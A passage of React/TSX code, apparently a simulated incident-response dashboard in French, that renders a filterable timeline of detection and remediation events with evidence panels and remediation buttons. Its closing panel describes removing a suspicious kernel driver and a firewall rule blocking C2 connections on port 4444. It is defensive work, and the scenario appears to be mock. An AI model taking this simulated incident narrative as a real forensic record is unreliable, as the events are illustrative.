              className={`px-3 py-1 rounded-lg whitespace-nowrap text-xs transition-colors shrink-0 ${
                selectedPhase === phase.id
                  ? 'bg-cyan-950 text-cyan-300 font-semibold border border-cyan-800'
                  : 'bg-slate-950/60 text-slate-400 hover:text-slate-200 border border-slate-800/80'
              }`}
            >
              {phase.label}
            </button>
          ))}

          <div className="ml-auto flex items-center gap-1.5 shrink-0 pl-2">
            <span className="text-slate-400">Gravité :</span>
            {['ALL', 'CRITICAL', 'HIGH', 'MEDIUM', 'INFO'].map(sev => (
              <button
                key={sev}
                onClick={() => setSelectedSeverity(sev)}
                className={`px-2 py-0.5 rounded text-[11px] font-mono transition-colors ${
                  selectedSeverity === sev
                    ? 'bg-slate-800 text-white font-bold border border-slate-700'
                    : 'text-slate-500 hover:text-slate-300'
                }`}
              >
                {sev}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Main Vertical Timeline Visualization */}
      <div className="relative pl-6 md:pl-10 space-y-8 before:absolute before:left-3 md:before:left-5 before:top-4 before:bottom-4 before:w-0.5 before:bg-gradient-to-b before:from-cyan-500 before:via-rose-500 before:to-emerald-500">
        {filteredEvents.map((evt, index) => {
          const isExpanded = expandedEventId === evt.id;
          const isCurrentlyHighlighted =
            currentPlaybackIndex >= 0 && events[currentPlaybackIndex]?.id === evt.id;
          const phaseColors = getPhaseColor(evt.phase);

          return (
            <div
              key={evt.id}
              id={`timeline-card-${evt.id}`}
              className={`relative transition-all duration-300 ${
                isCurrentlyHighlighted ? 'scale-[1.01]' : ''
              }`}
            >
              {/* Timeline Node Icon Indicator on the Vertical Line */}
              <div
                className={`absolute -left-6 md:-left-10 top-5 w-6 h-6 md:w-8 md:h-8 rounded-full border-2 flex items-center justify-center transition-all bg-slate-950 z-10 ${
                  isCurrentlyHighlighted
                    ? `${phaseColors.border} ring-4 ring-cyan-500/30 scale-125`
                    : evt.status === 'REMEDIATED' || evt.status === 'VERIFIED'
                    ? 'border-emerald-500 text-emerald-400'
                    : evt.severity === 'CRITICAL'
                    ? 'border-rose-500 text-rose-400'
                    : 'border-slate-700 text-slate-400'
                }`}
              >
                {evt.phase === 'SCAN' && <Search className="w-3 h-3 md:w-3.5 md:h-3.5 text-cyan-400" />}
                {evt.phase === 'DETECTION' && <ShieldAlert className="w-3 h-3 md:w-3.5 md:h-3.5 text-rose-400" />}
                {evt.phase === 'CONTAINMENT' && <Lock className="w-3 h-3 md:w-3.5 md:h-3.5 text-indigo-400" />}
                {evt.phase === 'EXCISION' && <Cpu className="w-3 h-3 md:w-3.5 md:h-3.5 text-purple-400" />}
                {evt.phase === 'HARDENING' && <CheckCircle2 className="w-3 h-3 md:w-3.5 md:h-3.5 text-emerald-400" />}
              </div>

              {/* Event Card Content */}
              <div
                className={`p-5 md:p-6 bg-slate-900/90 border rounded-xl transition-all shadow-xl backdrop-blur-sm ${
                  isCurrentlyHighlighted
                    ? `border-cyan-400 ring-2 ring-cyan-500/20 shadow-cyan-950/50 bg-slate-900`
                    : 'border-slate-800 hover:border-slate-700'
                }`}
              >
                {/* Event Card Header */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800/80 pb-3">
                  <div className="flex flex-wrap items-center gap-2">
                    <span className="text-xs font-mono font-bold text-cyan-400 px-2 py-0.5 rounded bg-cyan-950/80 border border-cyan-800/50">
                      {evt.timeDisplay}
                    </span>

                    <span className="text-xs font-semibold text-slate-400 font-mono">
                      {evt.phaseLabel}
                    </span>

                    {getSeverityBadge(evt.severity)}
                    {getStatusBadge(evt.status)}
                  </div>

                  {evt.mitreId && (
                    <div className="flex items-center gap-1.5 text-xs font-mono text-cyan-300 bg-slate-950 px-2.5 py-1 rounded border border-slate-800 shrink-0">
                      <span className="text-slate-500">MITRE:</span>
                      <span className="font-bold">{evt.mitreId}</span>
                      <span className="text-slate-400 hidden md:inline">({evt.mitreTactic})</span>
                    </div>
                  )}
                </div>

                {/* Event Title & Brief Description */}
                <div className="mt-3 space-y-2">
                  <div className="flex items-start justify-between gap-4">
                    <h3 className="text-base font-bold text-white tracking-tight flex items-center gap-2">
                      {evt.title}
                    </h3>

                    <button
                      onClick={() => setExpandedEventId(isExpanded ? null : evt.id)}
                      className="text-xs text-slate-400 hover:text-cyan-300 flex items-center gap-1 shrink-0 transition-colors"
                    >
                      <span>{isExpanded ? 'Masquer détails' : 'Forensique & Preuve'}</span>
                      {isExpanded ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
                    </button>
                  </div>

                  <p className="text-xs md:text-sm text-slate-300 leading-relaxed font-sans">
                    {evt.description}
                  </p>

                  {/* Security Score Impact & Risk Reduction Micro-Visualization */}
                  {evt.scoreDelta !== undefined && (
                    <div className="p-3 bg-slate-950/90 rounded-lg border border-slate-800 space-y-2">
                      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs">
                        <div className="flex flex-wrap items-center gap-2">
                          <span className="flex items-center gap-1 font-bold font-mono px-2 py-0.5 rounded text-xs bg-emerald-950/90 text-emerald-400 border border-emerald-800/60 shadow-sm">
                            <TrendingUp className="w-3 h-3 text-emerald-400" />
                            +{evt.scoreDelta} pts Score Sécurité
                          </span>

                          <span className="text-[11px] text-slate-400 font-mono">
                            Palier Score : <strong className="text-slate-300">{(evt.cumulativeScore || 0) - evt.scoreDelta}%</strong>
                            <span className="text-slate-500 mx-1">➔</span>
                            <strong className="text-emerald-400">{evt.cumulativeScore}%</strong>
                          </span>
                        </div>

                        <div className="flex items-center gap-2">
                          <span className="inline-flex items-center gap-1 text-[11px] font-mono text-cyan-300 bg-cyan-950/50 px-2 py-0.5 rounded border border-cyan-800/40">
                            <ShieldCheck className="w-3 h-3 text-cyan-400" />
                            Réduction Risque : <strong className="text-white">-{evt.riskReductionPercent}%</strong>
                          </span>

                          {evt.status === 'REMEDIATED' || evt.status === 'VERIFIED' ? (
                            <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-emerald-950/90 text-emerald-300 border border-emerald-800/80 flex items-center gap-1">
                              <Check className="w-2.5 h-2.5" /> Appliqué
                            </span>
                          ) : (
                            <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-amber-950/80 text-amber-300 border border-amber-800/80">
                              En attente
                            </span>
                          )}
                        </div>
                      </div>

                      {/* Visual Segmented Progress Bar */}
                      <div className="space-y-1">
                        <div className="h-1.5 w-full bg-slate-900 rounded-full overflow-hidden flex border border-slate-800/60">
                          <div
                            style={{ width: `${Math.max(0, (evt.cumulativeScore || 0) - (evt.scoreDelta || 0))}%` }}
                            className="h-full bg-slate-700 transition-all duration-300"
                          />
                          <div
                            style={{ width: `${evt.scoreDelta || 0}%` }}
                            className={`h-full transition-all duration-300 ${
                              evt.status === 'REMEDIATED' || evt.status === 'VERIFIED'
                                ? 'bg-emerald-400'
                                : 'bg-cyan-400 animate-pulse'
                            }`}
                          />
                          <div
                            style={{ width: `${Math.max(0, 100 - (evt.cumulativeScore || 0))}%` }}
                            className="h-full bg-slate-950"
                          />
                        </div>

                        <div className="flex items-center justify-between text-[10px] font-mono text-slate-500">
                          <span>Atténuation : <span className="text-slate-300">{evt.riskCategory}</span></span>
                          <span>Risque résiduel après étape : <span className="text-amber-400">{100 - (evt.cumulativeScore || 0)}%</span></span>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Artifact target row */}
                  {evt.targetArtifact && (
                    <div className="flex items-center gap-2 p-2 bg-slate-950 rounded-lg border border-slate-800/80 text-xs font-mono">
                      <span className="text-slate-500 shrink-0">Cible / Vecteur :</span>
                      <span className="text-amber-300 truncate select-all">{evt.targetArtifact}</span>
                      <button
                        onClick={() => handleCopy(evt.targetArtifact!, `artifact-${evt.id}`)}
                        className="ml-auto p-1 hover:bg-slate-800 text-slate-400 hover:text-slate-200 rounded shrink-0 transition-colors"
                        title="Copier le chemin"
                      >
                        {copiedId === `artifact-${evt.id}` ? (
                          <Check className="w-3.5 h-3.5 text-emerald-400" />
                        ) : (
                          <Copy className="w-3.5 h-3.5" />
                        )}
                      </button>
                    </div>
                  )}
                </div>

                {/* Expanded Technical Forensics Details */}
                {isExpanded && (
                  <div className="mt-4 pt-4 border-t border-slate-800/80 space-y-4">
                    <div className="space-y-1.5">
                      <div className="flex items-center justify-between text-xs text-slate-400">
                        <span className="flex items-center gap-1.5 font-semibold text-slate-300">
                          <Terminal className="w-3.5 h-3.5 text-cyan-400" />
                          Preuve Forensique & Télémétrie brute (Audit Logs / NT API) :
                        </span>
                        <button
                          onClick={() => handleCopy(evt.evidence, `evidence-${evt.id}`)}
                          className="flex items-center gap-1 text-[11px] hover:text-cyan-300 transition-colors"
                        >
                          {copiedId === `evidence-${evt.id}` ? (
                            <>
                              <Check className="w-3 h-3 text-emerald-400" />
                              <span className="text-emerald-400">Copié</span>
                            </>
                          ) : (
                            <>
                              <Copy className="w-3 h-3" />
                              <span>Copier la preuve</span>
                            </>
                          )}
                        </button>
                      </div>

                      <pre className="p-3 bg-slate-950 rounded-lg border border-slate-800 text-[11px] font-mono text-cyan-300/90 overflow-x-auto whitespace-pre leading-relaxed select-all">
                        {evt.evidence}
                      </pre>
                    </div>

                    {/* Result or remediation explanation */}
                    {evt.remediationResult && (
                      <div className="p-3 bg-emerald-950/30 border border-emerald-800/40 rounded-lg text-xs text-emerald-300 flex items-start gap-2">
                        <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                        <div>
                          <strong className="font-semibold text-emerald-200">Remédiation appliquée : </strong>
                          {evt.remediationResult}
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* Action Bar Footer for the Event */}
                <div className="mt-4 pt-3 border-t border-slate-800/60 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs">
                  <div className="flex items-center gap-2 text-slate-500 font-mono text-[11px]">
                    <span>Jalon {index + 1} sur {filteredEvents.length}</span>
                    <span>·</span>
                    <span>T+00:{evt.timeOffsetSec.toString().padStart(2, '0')}s</span>
                  </div>

                  <div className="flex items-center gap-2 shrink-0">
                    {evt.remediationActionCmd && (
                      <button
                        onClick={() => handleExecuteRemediation(evt)}
                        className={`flex items-center gap-1.5 px-3 py-1.5 rounded font-semibold text-xs transition-colors shadow-sm ${
                          evt.status === 'REMEDIATED' || evt.status === 'VERIFIED'
                            ? 'bg-slate-800 hover:bg-slate-700 text-slate-300'
                            : 'bg-cyan-500 hover:bg-cyan-400 text-slate-950'
                        }`}
                      >
                        <Zap className="w-3.5 h-3.5" />
                        <span>{evt.remediationButtonLabel || `Exécuter ${evt.remediationActionCmd}`}</span>
                      </button>
                    )}

                    <button
                      onClick={() => onRunInConsole(evt.remediationActionCmd || 'help')}
                      className="flex items-center gap-1 px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded font-mono text-xs transition-colors"
                      title="Inspecter dans la console"
                    >
                      <Terminal className="w-3 h-3 text-cyan-400" />
                      <span>Console</span>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* Post-Incident Hardening Summary Guide */}
      <div className="p-6 bg-slate-900 border border-slate-800 rounded-xl space-y-4">
        <h3 className="text-base font-bold text-white flex items-center gap-2">
          <Shield className="w-4 h-4 text-emerald-400" />
          Protocole de Sécurisation Après Détection & Excision
        </h3>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
          <div className="p-4 bg-slate-950 rounded-lg border border-slate-800 space-y-1.5">
            <div className="font-semibold text-cyan-300 flex items-center gap-1.5">
              <span>1. Redémarrage Machine Obligatoire</span>
            </div>
            <p className="text-slate-400 leading-relaxed">
              Le pilote <code className="text-slate-200">suspicious_kernel_hook.sys</code> est inscrit dans
              la clé <code className="text-amber-300">PendingFileRenameOperations</code>. La suppression
              définitive est achevée par le noyau NT avant le chargement des services tiers.
            </p>
          </div>

          <div className="p-4 bg-slate-950 rounded-lg border border-slate-800 space-y-1.5">
            <div className="font-semibold text-emerald-300 flex items-center gap-1.5">
              <span>2. Vérification des Tokens ACL</span>
            </div>
            <p className="text-slate-400 leading-relaxed">
              Les autorisations sur les dossiers système ont été réattribuées à <code className="text-slate-200">Administrateurs</code>.
              Aucune persistance résiduelle dans les répertoires <code className="text-amber-300">%TEMP%</code> et <code className="text-amber-300">AppData</code>.
            </p>
          </div>

          <div className="p-4 bg-slate-950 rounded-lg border border-slate-800 space-y-1.5">
            <div className="font-semibold text-purple-300 flex items-center gap-1.5">
              <span>3. Surveillance en Continu</span>
            </div>
            <p className="text-slate-400 leading-relaxed">
              Les règles de filtrage Netsh AdvFirewall et le scan des scripts PowerShell sont verrouillés.
              Toute nouvelle tentative de connexion C2 sur le port 4444 sera immédiatement bloquée.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
